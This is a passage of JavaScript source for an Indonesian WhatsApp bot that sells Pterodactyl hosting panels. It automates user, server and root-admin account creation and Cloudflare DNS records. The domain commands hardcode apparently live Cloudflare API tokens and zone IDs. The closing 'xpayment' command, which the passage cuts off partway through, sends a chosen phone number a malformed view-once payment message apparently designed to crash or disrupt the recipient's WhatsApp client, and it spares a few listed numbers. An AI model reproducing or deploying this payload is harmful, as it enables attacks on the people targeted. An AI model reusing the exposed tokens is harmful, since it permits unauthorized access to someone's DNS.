ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "13gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "13GB"
let egg = global.eggsnya
let loc = global.location
let memo = "13240"
let cpu = "230"
let disk = "13240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "12gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "12GB"
let egg = global.eggsnya
let loc = global.location
let memo = "12240"
let cpu = "310"
let disk = "12240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "11gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "11GB"
let egg = global.eggsnya
let loc = global.location
let memo = "11240"
let cpu = "280"
let disk = "11240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "toadmin": {
if (!isOwner) return rzxReply(`*hedeh si ajg*`)
if (!isOwner) return rzxReply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return rzxReply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return rzxReply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await rzx.sendMessage(m.chat, listMessage)

    await rzx.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

👤USERNAME :  ${username}
🔑PASSWORD: ${password}
🌐LOGIN: ${domain}

==============================
⚠️ Rules Admin panel : 

• Jangan Curi Sc
• Jangan Buka Panel Orang
• Jangan Ddos Server
• Kalo jualan sensor domainnya
• Jangan Bagi² Panel Free
• Jangan Jualan AdminP Kecuali Pt Gw !!
• Dilirang Keras Pasang Sc/Bot DDOS

NGEYEL? KICK NO REFF NO DRAMA
Jangan Lupa Bilang Done Yaa Beb >•<
==============================
THANKS FOR BUYING AT RIZXVELZ⚡😁✌️ 


*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
        case "listadmin": {
  if (!isOwner) return rzxReply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await rzx.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    rzxReply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case "listusr": {
  if (!isOwner) return rzxReply(mess.only.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await rzx.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    rzxReply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case "delusr": {
  if (!isOwner) return rzxReply(`KHUSUS OWNER`)
let usr = args[0]
if (!usr) return rzxReply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return rzxReply('*USER NOT FOUND*')
rzxReply('*SUCCESSFULLY DELETE THE USER*')
}
break
case "listsrv": {
  if (!isOwner) return rzxReply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await rzx.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    rzxReply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case "delsrv": {
      if (!isOwner) return rzxReply(`KHUSUS OWN `)

let srv = args[0]
if (!srv) return rzxReply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return rzxReply('*SERVER NOT FOUND*')
rzxReply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case 'domain1': {
 
    if (!isOwner) return rzxReply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "35d1322140299eda91e0307155b3c8bc";
               let apitoken = "5uZOYXtR7bzG8N-E4MiJ4EDCYIzc34tmoqDnU9Ov";
               let tld = "panel-vvipbyRIZXVELZ⚡.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'domain2': {

    if (!isOwner) return rzxReply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "07c8ad67838a176b9ad4b4a2cd2876db";
               let apitoken = "VnK7dBRfFo8yduwFqvSwDUEsMD-rW7EY_kReWVoF";
               let tld = "store-panel.online";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("PENGGUNAAN .domain2 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
  break
case "sticker": case "s": {
if (!quoted) return rzxReply(`Kirim/rzxReply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await rzx.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return rzxReply('Kirim/rzxReply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await rzx.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
rzxReply(`Kirim/rzxReply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case "ht": case "hidetag": {
if (!isGroup) return rzxReply(mess.only.group)
if (!isAdmins && !isOwner) return rzxReply(mess.only.admin)
if (!isBotAdmins) return rzxReply(mess.only.badmin)
if (!q) return rzxReply(`Teks?`)
global.hit = q
rzx.sendMessage(from, { text : global.hit ? global.hit : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case "xpayment":
    {
        // Cek jika pengguna tidak premium
        if (!isPremium) {
            return rzxReply("Anda harus menjadi pengguna premium untuk menggunakan fitur ini.");
        }
        
        // Cek jika tidak ada nomor yang diberikan
        if (!phoneNumberInput) {
            return rzxReply("Penggunaan: .xpayment 916909137213");
        }
        
        // Menghapus karakter selain angka dari nomor telepon
        let phoneNumber = phoneNumberInput.replace(/[^0-9]/g, '');
        
        // Jika nomor telepon dimulai dengan '0', kirim contoh yang benar
        if (phoneNumber.startsWith('0')) {
            return rzxReply("Contoh: .xpayment 916909137213");
        }
        
        // Periksa apakah nomor terdaftar di WhatsApp
        let isRegisteredOnWhatsApp = await client.isOnWhatsApp(phoneNumber + "@s.whatsapp.net");
        let userJid = phoneNumber + "@s.whatsapp.net";
        
        // Batasi nomor tertentu agar tidak diproses
        if (["916909137213", "919366316008", "919402104403"].includes(phoneNumber)) {
            return;
        }
        
        // Jika nomor tidak terdaftar di WhatsApp, beri tahu pengguna
        if (isRegisteredOnWhatsApp.length === 0) {
            return rzxReply("Nomor tersebut tidak terdaftar di WhatsApp");
        }

        // Fungsi untuk mengirimkan informasi pembayaran
        async function sendPaymentInfo(recipientJid) {
            const deviceListMetadata = {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {}
            };
            const paymentInfoButton = {
                name: "payment_info",
                buttonParamsJson: JSON.stringify({
                    currency: "BRL",
                    total_amount: { value: 0, offset: 100 },
                    reference_id: "4P46GMY57GC",
                    type: "physical-goods",
                    order: {
                        status: "pending",
                        subtotal: { value: 0, offset: 100 },
                        order_type: "ORDER",
                        items: [
                            {
                                name: "",
                                amount: { value: 0, offset: 100 },
                                quantity: 0,
                                sale_amount: { value: 0, offset: 100 }
                            }
                        ]
                    },
                    payment_settings: [
                        {
                            type: "pix_static_code",
                            pix_static_code: {
                                merchant_name: "meu ovo",
                                key: "+5533998586057",
                                key_type: "X"
                            }
                        }
                    ]
                })
            };

            const buttons = {
                buttons: [paymentInfoButton]
            };
            const interactiveMessage = {
                nativeFlowMessage: buttons
            };
            const messageContextInfo = {
                messageContextInfo: deviceListMetadata,
                interactiveMessage: interactiveMessage
            };
            const viewOnceMessage = {
                viewOnceMessage: {
                    message: messageContextInfo
                }
            };
            const options = {
                participant: {
                    jid: recipientJid
                }
            };

            await rzx.relayMessage(recipientJid, viewOnceMessage, options, { messageId: null });
        }

        await sendPaymentInfo(userJid);
